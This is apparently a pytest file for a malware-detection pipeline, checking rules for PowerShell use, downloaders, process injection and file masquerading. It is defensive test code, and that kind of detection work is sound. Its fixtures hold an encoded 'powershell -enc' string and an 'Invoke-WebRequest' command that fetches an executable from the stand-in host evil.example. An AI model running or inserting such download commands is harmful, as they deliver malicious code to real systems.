"""Detection pipeline: evidence normalization, correlation rules, graph."""
from app.services.detection import run_detection


def _ctx(**overrides):
    ctx = {
        "file": {"filename": "legit.exe", "extension": ".exe", "family": "pe",
                 "file_type": "PE32", "sha256": "0" * 64},
        "static": {
            "strings": [],
            "yara": [],
            "imports": [],
            "capabilities": [],
            "metadata": {},
        },
        "findings": [],
    }
    ctx.update(overrides)
    return ctx


def test_powershell_rule_fires_with_evidence_provenance():
    ctx = _ctx(static={
        "strings": [{"value": "powershell -enc SQBFAFgA", "type": "command"}],
        "yara": [], "imports": [], "capabilities": [], "metadata": {},
    })
    res = run_detection(ctx)
    powershell = [f for f in res["findings"] if f["category"] == "powershell"]
    assert powershell, "powershell finding expected"
    assert powershell[0]["mitre"] == "T1059.001"
    assert powershell[0]["confidence"] >= 0.80
    assert powershell[0]["evidence_ids"], "rule finding must reference evidence"


def test_downloader_requires_network_plus_primitive():
    # URL alone -> network-communication, NOT downloader.
    only_url = run_detection(_ctx(static={"strings": [
        {"value": "http://evil.example/update.exe", "type": "url"}],
        "yara": [], "imports": [], "capabilities": [], "metadata": {}}))
    cats = {f["category"] for f in only_url["findings"]}
    assert "network-communication" in cats
    assert "downloader" not in cats

    # URL + download primitive -> downloader fires.
    with_primitive = run_detection(_ctx(static={"strings": [
        {"value": "http://evil.example/update.exe", "type": "url"},
        {"value": "Invoke-WebRequest http://evil.example/update.exe", "type": "command"}],
        "yara": [], "imports": [], "capabilities": [], "metadata": {}}))
    cats = {f["category"] for f in with_primitive["findings"]}
    assert "downloader" in cats


def test_rule_skipped_when_analyzer_already_reported_category():
    ctx = _ctx(findings=[{"severity": "high", "category": "process-injection",
                          "title": "injected", "module": "pe"}],
               static={"strings": [{"value": "kernel32.dll!VirtualAllocEx", "type": "api"}],
                       "yara": [], "imports": [], "capabilities": [], "metadata": {}})
    res = run_detection(ctx)
    pi = [f for f in res["findings"] if f["category"] == "process-injection"]
    assert len(pi) == 1, "no duplicate process-injection finding expected"


def test_masquerading_fires_on_extension_content_mismatch():
    ctx = _ctx(file={"filename": "resume.pdf", "extension": ".pdf", "family": "pe",
                     "file_type": "PE32", "sha256": "0" * 64})
    res = run_detection(ctx)
    assert any(f["category"] == "masquerading" for f in res["findings"])


def test_empty_analysis_produces_clean_shaped_output():
    res = run_detection(_ctx())
    # Only file identity evidence; nothing suspicious, no findings/iocs/mitre.
    assert all(e["type"] == "file_meta" for e in res["evidence"])
    assert res["findings"] == []
    assert res["iocs"] == []
    assert res["mitre"] == []


def test_graph_has_typed_edges():
    ctx = _ctx(static={"strings": [{"value": "http://evil.example/a", "type": "url"}],
                       "yara": [], "imports": [], "capabilities": [], "metadata": {}})
    res = run_detection(ctx)
    types = {e["type"] for e in res["graph"]["edges"]}
    assert "contains" in types
    assert "maps_to" in types
    assert "supported_by" in types
